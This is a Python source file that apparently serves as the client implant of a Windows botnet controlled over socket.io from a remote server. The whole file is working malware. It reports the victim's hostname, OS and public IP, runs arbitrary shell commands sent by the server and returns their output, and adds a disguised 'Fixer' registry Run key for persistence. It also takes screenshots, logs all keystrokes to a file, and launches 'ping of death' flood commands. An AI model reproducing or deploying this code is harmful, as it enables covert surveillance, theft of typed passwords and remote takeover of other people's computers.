# Client.py

import platform
import socket
import winreg
import os, uuid
import subprocess
import requests
import pyscreenshot as ImageGrab
from pynput import keyboard
import socketio

info = {}
client = socketio.Client()

persistenceVariable = False
keyloggerVaraible = False
screenshotNumber = 1
keyloggerNumber = 1
completedTasks = []
hostname = socket.gethostname()

def take_screenshot(hostname):
    global screenshotNumber
    try:
        filename = f"{hostname}_screenshot_{screenshotNumber}.png"
        screenshot = os.path.join(filename)
        im = ImageGrab.grab()
        im.save(screenshot)
        screenshotNumber += 1
        return screenshot
    except Exception as e:
        return str(e)

def create_key(name="default", path="") -> bool:
    reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
    if not reg_key:
        return False
    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, path)
    reg_key.Close()
    return True

def try_persistence():
    if create_key("Fixer", str(os.path.realpath(__file__))):
        return True
    else:
        return False

def start_keylogger(key):
    if not os.path.exists(f"{hostname}_keylogs.txt"):
        open(f"{hostname}_keylogs.txt", 'a+').close()

    with open(f"{hostname}_keylogs.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.backspace:
                logkey.write(' [BACKSPACE] ')
            elif key == keyboard.Key.enter:
                logkey.write(' \n ')
            elif key == keyboard.Key.shift:
                logkey.write(' [SHIFT] ')
            elif key == keyboard.Key.tab:
                logkey.write(' [TAB] ')
            elif key == keyboard.Key.ctrl:
                logkey.write(' [CTRL] ')
            elif key == keyboard.Key.alt:
                logkey.write(' [ALT] ')
            elif key == keyboard.Key.caps_lock:
                logkey.write(' [CAPS-LOCK] ')
            elif key == keyboard.Key.num_lock:
                logkey.write(' [NUM-LOCK] ')
            elif key == keyboard.Key.esc:
                logkey.write(' [ESC] ')
            elif key == keyboard.Key.delete:
                logkey.write(' [DELETE] ')
            elif key == keyboard.Key.page_up:
                logkey.write(' [PAGE-UP] ')
            elif key == keyboard.Key.page_down:
                logkey.write(' [PAGE-DOWN] ')
            elif key == keyboard.Key.insert:
                logkey.write(' [INSERT] ')
            elif key == keyboard.Key.print_screen:
                logkey.write(' [PRINT-SCREEN] ')
            else:
                pass

@client.on('ping')
def handle_ping(ping):
    idNumber = ping.get('idNumber')
    command = ping.get('command')
    ip_address = ping.get('ip_address')
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        for line in iter(process.stdout.readline, b''):
            if f'Pinging {ip_address} with 65500 bytes of data' in line:
                output = "PING-OF-DEATH Command Executed Successfully"
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
        else:
            output = "ERROR : Command could not be Executed"
            client.emit('ping_output', {'idNumber': idNumber, 'output': output})
    except Exception as e:
        error_message = str(e)
        print(f"Exception occurred: {error_message}")
        client.emit('ping_output', {'idNumber': idNumber, 'output': f"ERROR: {error_message}"})

@client.on('commands')
def handle_commands(commands):
    idNumber = commands.get('idNumber')
    command = commands.get('command')
    hostname = commands.get('hostname')
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8').strip()
        error_str = error.decode('utf-8').strip()
        if error_str:
            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : error_str})
        else:
            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : output_str})
    except Exception as e:
        return f"ERROR: {str(e)}"

@client.on("module")
def message(module):
    global persistenceVariable, keyloggerNumber, completedTasks, keyloggerVaraible
    idNumber = module.get('idNumber')
    command = module.get('command')
    hostname = module.get('hostname')

    try:
        if command == 'persistence':
            if not persistenceVariable:
                if try_persistence():
                    persistenceVariable = True
                    result = "Persistence Key Has Been Added"
                    module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
                else:
                    result = "Persistence Key Could Not be Added"
                    module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
            else:
                result = "Persistence Key Already Added"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
        elif command == 'screenshot':
            screenshot_pic = take_screenshot(hostname)
            if isinstance(screenshot_pic, str):
                result = f"Screenshot Has Been Captured"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
            else:
                result = f"Screenshot Could not be Captured"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
        elif command == 'keylogger':
            if not keyloggerVaraible:
                listener = keyboard.Listener(on_press=start_keylogger)
                listener.start()
                keyloggerVaraible = True
                result = "Keylogger has been started"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
            elif keyloggerVaraible:
                result = "Keylogger has Already been started"
                module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
        else:
            result = "Keylogger Could not be Started"
            module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}

        client.emit('module_output', module_output)
    except Exception as e:
        print("ERROR : ", str(e))

def send_output_to_server(output):
    client.emit('message', output)

info['COMMAND'] = 'INFO'
info["idNumber"] = str(uuid.uuid4())
info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()
info["IP"] = requests.get('https://api.ipify.org').text

@client.event
def connect():
    info['sid'] = client.sid
    client.emit('Initial_Information', info)
    print('SUCCESSFULLY CONNECTIED TO THE SERVER ✅')

@client.event
def disconnect():
    print('PAINFULLY DISCONNECTED FROM THE SERVER ❌')
    client.emit('message', {'COMMAND': 'OUTPUT', 'idNumber': info['idNumber'], 'command': 'status update', 'DATA': 'Bot is dead'})

print("CONNECTING TO THE SERVER ⏳ ")
client.connect('http://192.168.100.222:5000')
client.wait()
